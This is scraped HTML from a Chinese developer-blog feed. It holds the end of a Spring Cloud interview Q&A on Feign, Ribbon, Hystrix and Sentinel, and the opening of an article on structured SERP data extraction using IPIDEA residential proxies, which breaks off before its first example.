<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">ribbon:</span>
	<span class="hljs-attr">eager-load:</span>
		<span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
			<span class="hljs-attr">clients:</span> <span class="hljs-string">service-1</span>
</code></pre>
<p>那怎么解决这个问题呢？</p>
<p>可以在应用启动时预热Feign客户端，自动触发一次无关紧要的调用，来提前加载Ribbon和其他相关组件。这样，就相当于提前进行了第一次调用。</p>
<h3 data-id="heading-22">Feign怎么实现认证传递？</h3>
<p>比较常见的一个做法是，使用拦截器传递认证信息。可以通过实现RequestInterceptor接口来定义拦截器，在拦截器里，把认证信息添加到请求头中，然后将其注册到Feign的配置中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignClientConfig</span> {

	<span class="hljs-meta">@Bean</span>
	<span class="hljs-keyword">public</span> RequestInterceptor <span class="hljs-title function_">requestInterceptor</span><span class="hljs-params">()</span> {
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestInterceptor</span>() {
			<span class="hljs-meta">@Override</span>
			<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(RequestTemplate template)</span> {
				<span class="hljs-comment">// 添加认证信息到请求头中</span>
				template.header(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + getToken());
			}
		};
	}
	
	<span class="hljs-keyword">private</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">()</span> {
		<span class="hljs-comment">// 获取认证信息的逻辑，可以从SecurityContext或其他地方获取</span>
		<span class="hljs-comment">// 返回认证信息的字符串形式</span>
		<span class="hljs-keyword">return</span> <span class="hljs-string">"your_token"</span>;
	}
}
</code></pre>
<h3 data-id="heading-23">Fegin怎么做负载均衡？Ribbon?</h3>
<p>在Feign中，负载均衡是通过集成Ribbon来实现的。</p>
<p>Ribbon是Netflix开源的一个客户端负载均衡器，可以与Feign无缝集成，为Feign提供负载均衡的能力。</p>
<p>Ribbon在发起请求前，会从“服务中心”获取服务列表（清单），然后按照一定的负载均衡策略去发起请求，从而实现客户端的负载均衡。Ribbon本身也维护着“服务提供者”清单的有效性。如果它发现“服务提供者”不可用，则会重新从“服务中心”获取有效的“服务提供者”清单来及时更新。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcfd96d8835f4c29945bbed24a67d80f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=Snu78zbJDAfxJ5uy8Vz2XHfcpiw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-24">Feign 和 OpenFeign 的区别?</h3>
<p>Feign 和 OpenFeign 都是用于简化服务之间的 HTTP 调用的工具，让我们可以更加方便地实现服务间的通信</p>
<p>Feign 最初是由 Netfix 开发的一个声明式, REST 客户端框架，它的目标是让微服务之间的调用像调用本地方法一样容易。如果我们想调用其它服务的接口，可以创建一个接口，然后通过注解声明所需要调用服务的方法和路径，Feign 可以自动发送 Http 请求和接收响应，转换为方法返回值</p>
<p>而 OpenFeign 是 Spring Cloud在 Feign 的基础上进一步封装的，它整合了 Spring Cloud 的特性，使得我们可以更加简单地使用 Feign，包括如下几个方面：</p>
<ul>
<li>自动配置：Openfeign利用Spring Boot的自动配置机制，通过@FeignClien和@EnableFeignClients 注解就可以创建一个 Feign 客户端，极大简化了Feign客户端的创建和配置过程。</li>
<li>负载均衡:与Spring Cloud等服务发现组件集成，可以轻松实现客户端负载均衡</li>
<li>Hystrix集成：只需要简单的配置就可以快速集成Hystrix，提高系统的容错性</li>
</ul>
<h2 data-id="heading-25">服务容灾</h2>
<h3 data-id="heading-26">什么是熔断器?为什么需要熔断器?</h3>
<p>在微服务架构中，服务之间的调用关系会形成调用链路，链路中的任何一个服务都可能出现超时或者宕机的情况，而在微服务系统中，如果调用失败的话可能会引起大面积的服务瘫痪，即形成“服务雪崩”的情况，这样的话对于服务的影响是巨大的。</p>
<p>熔断器就是为了来解决这个问题，避免服务雪崩情况的发生。</p>
<p>熔断器的基本原理如下：</p>
<ul>
<li>正常情况下，熔断器处于关闭状态，服务消费者正常请求微服务中的服务提供者。</li>
<li>当发生了服务调用清求失败的时候，并且达到了一定比例，比如70% 的清求发生了失败，或者失败的清求次数达到了10等等，这个时候熔断器打开，此时将服务调用者不再发起服务调用请求，这种方法是一种快速失败的方法，也称为熔断方法。</li>
<li>熔断器启用一段时间时候，自动进入“半关闭状态”，这个时候熔断器允许服务调用者发起一个请求给服务提供者，如果请求调用成功了，关闭熔断器，反之继续打开熔断器，循环往复。</li>
</ul>
<p>这种方式在服务发生意外的时候，可以实现服务错误的隔离，避免了服务错误导致了系统的整体不可用，这样保证了系统即使出现了局部问题也不会发生服务雪崩的情况。</p>
<h3 data-id="heading-27">什么是服务雪崩？</h3>
<p>在微服务中，假如一个或者多个服务出现故障，如果这时候，依赖的服务还在不断发起请求，或者重试，那么这些请求的压力会不断在下游堆积，导致下游服务的负载急剧增加。不断累计之下，可能会导致故障的进一步加剧，可能会导致级联式的失败，甚至导致整个系统崩溃，这就叫服务雪崩。</p>
<p>一般，为了防止服务雪崩，可以采用这些措施：</p>
<ul>
<li>服务高可用部署：确保各个服务都具备高可用性，通过冗余部署、故障转移等方式来减少单点故障的影响。</li>
<li>限流和熔断：对服务之间的请求进行限流和熔断，以防止过多的请求涌入导致后端服务不可用。</li>
<li>缓存和降级：合理使用缓存来减轻后端服务的负载压力，并在必要时进行服务降级，保证核心功能的可用性。</li>
</ul>
<h3 data-id="heading-28">什么是服务熔断？</h3>
<p>熔断机制是应对雪崩效应的一种微服务链路保护机制。当某个微服务不可用或者响应时间太长时，会进行服务降级，进而熔断该节点微服务的调用，快速返回“错误”的响应信息。当检测到该节点微服务调用响应正常后恢复调用链路。在Spring Cloud框架里熔断机制通过Hystrix实现，Hystrix会监控微服务间调用的状况，当失败的调用到一定阈值，缺省是5秒内调用20次，如果失败，就会启动熔断机制。</p>
<h3 data-id="heading-29">什么是服务降级？</h3>
<p>服务降级，一般是从整体负荷考虑。当系统出现异常情况时，服务降级会主动屏蔽一些非核心或可选的功能，而只提供最基本的功能，以确保系统的稳定运行。通过减少对资源的依赖，服务降级可以保证系统的可用性和性能。  它可以根据业务需求和系统状况来制定策略，例如替换耗时操作、返回默认响应、返回静态错误页面等。</p>
<p><code>Hystrix</code>相关注解<code>@EnableHystrix</code>：开启熔断 <code>@HystrixCommand(fallbackMethod=”XXX”)</code>，声明一个失败回滚处理函数<code>XXX</code>，当被注解的方法执行超时（默认是1000毫秒），就会执行<code>fallback</code>函数，返回错误提示。</p>
<h3 data-id="heading-30">什么是服务限流?</h3>
<p>服务限流是一种流量控制策略，它通过限制每秒请求的数量(QPS)、请求频率、并发数等，来保护服务的处理能力，防止系统因为流量过大而出现性能问题或资源耗尽服务限流可以认为是服务降级的一种，限流就是通过限制系统清求的输入和输出，从而实现对于系统的保护，这个和降级的概念很像，都是为了保证核心功能的正常运行。限流是因为服务的吞吐量以及负载这些都是可以预估的，我们为了保证系统的正常运行，可以设置限制的國值，即涌过限制输入或者输出的方式来减少流量的流通，然后实现对于系统的保护限流有很多种实现方案，比如我们说的限流算法、延迟解决、拒绝解决等等，保证请求的范围在系统可以接受的阈值以内，实现对系统的保护。</p>
<h3 data-id="heading-31">有哪些熔断降级方案实现？</h3>
<p>目前常见的服务熔断降级实现方案有这么几种：</p>






























<table><thead><tr><th>框架</th><th>实现方案</th><th>特点</th></tr></thead><tbody><tr><td>Spring Cloud</td><td>Netflix Hystrix</td><td>提供线程隔离、服务降级、请求缓存、请求合并等功能；<br/>可与Spring Cloud其他组件无缝集成 <br/>官方已宣布停止维护，推荐使用Resilience4j代替</td></tr><tr><td>Spring Cloud</td><td>Resilience4j</td><td>轻量级服务熔断库 <br/>提供类似于Hystrix的功能 - 具有更好的性能和更简洁的API <br/>可与Spring Cloud其他组件无缝集成</td></tr><tr><td>Spring Cloud Alibaba</td><td>Sentinel</td><td>阿里巴巴开源的流量控制和熔断降级组件 <br/>提供实时监控、流量控制、熔断降级等功能 <br/>与Spring Cloud Alibaba生态系统紧密集成</td></tr><tr><td>Dubbo</td><td>Dubbo自带熔断降级机制</td><td>Dubbo框架本身提供的熔断降级机制 <br/>可通过配置实现服务熔断和降级 <br/>与Dubbo的RPC框架紧密集成</td></tr></tbody></table>
<h3 data-id="heading-32">什么是Hystrix？</h3>
<p>Hystrix是一个延迟和容错库，旨在隔离远程系统，服务和第三方库的访问点，当出现故障是不可避免的故障时，停止级联故障并在复杂的分布式系统中实现弹性。</p>
<p>通常对于使用微服务架构开发的系统，涉及到许多微服务。这些微服务彼此协作。</p>
<p>思考一下微服务：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a0e8600140e4f1284e2385033908a82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=9l5qoEvOOOkpDYvCqFIDeKYwfng%3D" alt="" loading="lazy"/></p>
<p>假设如果上图中的微服务9失败了，那么使用传统方法我们将传播一个异常。但这仍然会导致整个系统崩溃。</p>
<p>随着微服务数量的增加，这个问题变得更加复杂。微服务的数量可以高达1000.这是hystrix出现的地方 我们将使用Hystrix在这种情况下的Fallback方法功能。我们有两个服务employee-consumer使用由employee-consumer公开的服务。</p>
<p>简化图如下所示</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65eb2fc5245c4bf785ec33519f1f8e86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=wwZ5caIOvGk6ki31iLFCZBQPniM%3D" alt="" loading="lazy"/></p>
<p>现在假设由于某种原因，employee-producer公开的服务会抛出异常。我们在这种情况下使用Hystrix定义了一个回退方法。这种后备方法应该具有与公开服务相同的返回类型。如果暴露服务中出现异常，则回退方法将返回一些值。</p>
<h3 data-id="heading-33">Hystrix如何实现容错？</h3>
<p>尽管已经不再更新，但是Hystrix是非常经典的服务容错开源库，它提供了多种机制来保护系统，Hystrix服务容错六大机制：</p>
<ol>
<li>服务熔断（Circuit Breaker）：Hystrix通过设置阈值来监控服务的错误率或响应时间。当错误率或响应时间超过预设的阈值时，熔断器将会打开，后续的请求将不再发送到实际的服务提供方，而是返回预设的默认值或错误信息。这样可以快速隔离故障服务，防止故障扩散，提高系统的稳定性和可用性。</li>
<li>服务降级（Fallback）：当服务熔断打开时，Hystrix可以提供一个备用的降级方法或返回默认值，以保证系统继续正常运行。开发者可以定义降级逻辑，例如返回缓存数据、执行简化的逻辑或调用其他可靠的服务，以提供有限但可用的功能。</li>
<li>请求缓存（Request Caching）：Hystrix可以缓存对同一请求的响应结果，当下次请求相同的数据时，直接从缓存中获取，避免重复的网络请求，提高系统的性能和响应速度。</li>
<li>请求合并（Request Collapsing）：Hystrix可 以将多个并发的请求合并为一个批量请求，减少网络开销和资源占用。这对于一些高并发的场景可以有效地减少请求次数，提高系统的性能。</li>
<li>实时监控和度量（Real-time Monitoring and Metrics）：Hystrix提供了实时监控和度量功能，可以对服务的执行情况进行监控和统计，包括错误率、响应时间、并发量等指标。通过监控数据，可以及时发现和解决服务故障或性能问题。</li>
<li>线程池隔离（Thread Pool Isolation）：Hystrix将每个依赖服务的请求都放在独立的线程池中执行，避免因某个服务的故障导致整个系统的线程资源耗尽。通过线程池隔离，可以提高系统的稳定性和可用性。</li>
</ol>
<h3 data-id="heading-34">说下Hystrix与Sentinel的区别</h3>
<p>Hystrix和Sentinel都是服务熔断器，用于提高分布式系统的弹性。它们的主要区别在于实现方式、适用场景和资源模型设计。</p>
<p>Hystrix基于命令模式设计，将外部资源的调用封装在命令对象中，通过线程池或信号量来实现隔离。它提供了丰富的配置选项，如线程池大小、超时时间等，以实现对系统资源的有力控制。Hystrix更适用于需要高并发、快速响应的场景，因为它可以快速隔离和恢复故障。</p>
<p>Sentinel则基于流量控制和熔断降级的思想，可以与Spring Cloud、gRPC、Dubbo等框架集成。它通过定义资源规则和应用策略来实现对系统资源的控制。Sentinel更适用于需要流量控制和熔断降级的场景，它可以根据系统负载和响应时间来实现自动熔断和降级操作。</p>
<p>总之，Hystrix和Sentinel都是服务熔断器，用于提高系统的弹性。它们在实现方式、适用场景和资源模型设计等方面存在一些不同。具体选择哪个工具取决于系统的具体需求和场景。</p>
<h3 data-id="heading-35">Sentinel采用的什么限流算法？</h3>
<p>Sentinel使用滑动窗口限流算法来实现限流。</p>
<p>滑动窗口限流算法是一种基于时间窗口的限流算法。它将一段时间划分为多个时间窗口，并在每个时间窗口内统计请求的数量。通过动态地调整时间窗口的大小和滑动步长，可以更精确地控制请求的通过速率。</p>
<h3 data-id="heading-36">Sentinel是怎么实现限流的?</h3>
<p>首先需要定义具体需要限流的资源，然后指定一定的规则(基于QPS(每秒查询数)、线程数等维度)，限制资源的访问频次。然后根据一定的限流算法(固定窗口、滑动窗口、令牌桶和漏桶)，对指定的资源进行访问的流量控制。具体流程如下：</p>
<ol>
<li>当一个请求进入系统时，Sentinel 会首先对请求进行统计(如当前的 QPS、并发数)</li>
<li>接着 Sentine| 检查配置的限流规则，如果当前请求的速率超过了设定的限流阈值，Sentinel 将触发限流措施</li>
<li>对于被限流的请求，可以选择直接拒绝、排队等待、或返回降级响应等方式来处理，保证系统核心功能的稳定</li>
</ol>
<h3 data-id="heading-37">Sentinel怎么实现集群限流？</h3>
<p>Sentinel利用了Token Server和Token Client的机制来实现集群限流。</p>
<p>开启集群限流后，Client向Token Server发送请求，Token Server根据配置的规则决定是否限流。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d858799314424e6dbf1a6921fe6464e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309706&amp;x-signature=36ayIS1Wicnra8XdkBJEpe9G72g%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于 IPIDEA 的 SERP 结构化数据抽取与趋势监控的工程化实践]]></title>    <link>https://juejin.cn/post/7574344443824979968</link>    <guid>https://juejin.cn/post/7574344443824979968</guid>    <pubDate>2025-11-20T06:14:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574344443824979968" data-draft-id="7574369095544635426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于 IPIDEA 的 SERP 结构化数据抽取与趋势监控的工程化实践"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-20T06:14:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="海拥"/> <meta itemprop="url" content="https://juejin.cn/user/2040341402229751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于 IPIDEA 的 SERP 结构化数据抽取与趋势监控的工程化实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2040341402229751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    海拥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T06:14:39.000Z" title="Thu Nov 20 2025 06:14:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h3 data-id="heading-0">为什么要做 SERP 结构化处理？</h3>
<p>在日常 SEO 或数据采集工作中，我们往往关注几个常规指标：某个关键词排名第几、某个页面是否掉出前十、今天的排名相比昨天是上升还是下降。这样的分析虽然直观，但随着 Google、Bing 等搜索引擎不断丰富搜索结果页（SERP）的内容，仅仅看排名已经不足以揭示用户真正的搜索意图，更无法支撑深度的商业决策。</p>
<p>事实上，<strong>SERP 本身的结构就能提供很多有价值的信息</strong>。以搜索关键词 <strong>「best wireless earbuds」</strong> 为例，不同模块可能透露出截然不同的商业信号：</p>
<ul>
<li><strong>Shopping 模块</strong>：如果此模块出现且位置靠前，表明该关键词的商业意图强烈，用户正处于购买决策阶段。</li>
<li><strong>新闻模块</strong>：意味着该关键词对时效性要求高，可能是有新品发布或重大行业事件，是公关和内容营销的黄金机会。</li>
<li><strong>YouTube 视频</strong>：说明用户偏好视频这种信息载体。对于品牌方而言，投资视频内容可能比传统博客文章带来更高的回报。</li>
<li><strong>知识卡片</strong>：搜索意图偏向于快速的事实查询。如果目标是品牌曝光或获取潜在客户，这类关键词的转化率可能较低。</li>
<li><strong>广告位数量与分布</strong>：直接反映了该关键词的竞争程度与商业价值。顶部和底部布满广告，意味着这是一个“兵家必争”的高价值词。</li>
</ul>
<p>结构化处理 SERP 的本质，是将一个杂乱的 HTML 页面，转化为一个标准化的、可量化的、可监控的数据模型。 通过分析这些模块，我们不仅能更准确地理解搜索意图，还能为 SEO 策略、内容规划、产品方向和市场判断提供直接的数据支撑，实现从“猜测”到“数据驱动”的跨越。</p>
<hr/>
<h3 data-id="heading-1"><strong>多区域 SERP 差异</strong></h3>
<p>同一个关键词在不同国家、地区甚至城市呈现的 SERP 可能天差地别，这背后反映了文化、消费习惯、市场竞争和互联网生态的巨大差异。因此，仅凭单一地区的搜索结果做决策，对于全球化业务来说是远远不够的。例如：</p>
<p>美国 SERP 的第一屏可能是电商 Shopping，德国 SERP 的第一屏可能是新闻，日本 SERP 可能加入视频 + 图集。因此，结构化和可视化 SERP 数据是必要的，而不仅是简单抓 HTML。</p>
<h2 data-id="heading-2"><strong>需求分析：结构化 SERP + 趋势监控</strong></h2>
<p>根据实际项目需求，可以将其拆成两个部分：</p>
<hr/>
<h3 data-id="heading-3"><strong>（1）结构化 SERP：把页面变成可分析数据</strong></h3>
<p>即：抓取 SERP，识别模块结构（网页、新闻、视频、图集、广告、Shopping、Google 模块），JSON-LD 内容解析，输出统一格式的 JSON。</p>
<p>这个步骤涉及更多工程细节，是本文实战的重点。</p>
<h3 data-id="heading-4"><strong>（2）趋势监控：持续记录 SERP 的结构变化</strong></h3>
<p>例如：</p>
<ul>
<li>持续记录 SERP 模块变化</li>
<li>观察普通网页数量、新闻/视频模块增减、广告位变化、相关搜索关键词变化等</li>
<li>生成趋势图或报告，为内容策略和市场分析提供数据支撑</li>
</ul>
<hr/>
<h2 data-id="heading-5">IPIDEA 动态住宅 IP 配置说明</h2>
<p>为了稳定抓取跨区域 SERP，可以使用 IPIDEA 动态住宅 IP，操作流程如下</p>
<p>1.登录 <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.ipidea.net%2F%3Futm-source%3Dhyy%26utm-keyword%3D%3Fhyy" target="_blank" title="http://www.ipidea.net/?utm-source=hyy&amp;utm-keyword=?hyy" ref="nofollow noopener noreferrer">IPIDEA</a> 面板，选择“动态住宅 IP”，将本地 IP 添加到白名单。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1b9c39c2cdb4701b524fd124972a226~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=dAEab0YBun1b0jiyx2FdrZ3doWI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="2">
<li>在 API 获取中选择动态住宅 IP，设置扣费方式、国家/地区、每次提取数量、代理协议和数据格式，点击生成链接。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91bec83369db417b800a2353f4ddf32a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=wcdIbIRZL9VyG4dF1qvu2QisTGg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="3">
<li>使用浏览器访问 API 链接，确认返回数据格式正确。</li>
</ol>
<hr/>
<h2 data-id="heading-6">实操示例 1：抓取 PyPI requests 包并分析趋势</h2>
